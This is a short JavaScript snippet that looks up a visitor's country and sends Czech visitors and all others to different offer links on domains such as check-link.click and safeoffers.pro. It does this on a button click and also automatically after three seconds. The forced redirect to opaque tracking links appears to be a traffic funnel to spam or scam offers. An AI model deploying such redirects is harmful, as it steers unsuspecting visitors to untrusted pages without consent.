// UPDATED GEO LINKS
const czLink = "https://check-link.click/a/ERKgXupp1LsPQkl";
const globalLink = "https://safeoffers.pro/a/yPp4AI32ZfQ47G";

async function getVisitorCountry() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    return data.country_code;
  } catch {
    return null;
  }
}

async function redirectUser() {
  const country = await getVisitorCountry();
  const target = country === "CZ" ? czLink : globalLink;
  window.location.href = target;
}

// redirect on button click
document.getElementById("joinBtn").onclick = redirectUser;

// auto redirect after 3 seconds
setTimeout(redirectUser, 3000);
